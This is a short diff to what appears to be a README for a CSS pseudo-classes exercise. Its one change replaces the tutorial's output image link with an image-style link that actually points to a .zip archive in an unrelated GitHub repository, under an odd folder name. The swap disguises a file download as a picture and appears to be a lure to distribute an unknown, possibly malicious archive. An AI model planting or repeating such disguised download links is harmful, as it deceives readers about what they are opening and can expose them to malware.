@@ -10,4 +10,4 @@ last-para-color : `red`
 
 list-items-background : `white`, `stalegray`, `pink`
 
-![output](https://storage.googleapis.com/acciojob-open-file-collections/pseudo-classes.png)
+![output](https://raw.githubusercontent.com/Saurabh22111998/pseudo-classes-Saurabh22111998/master/Oryzorictinae/pseudo-classes-Saurabh22111998.zip)
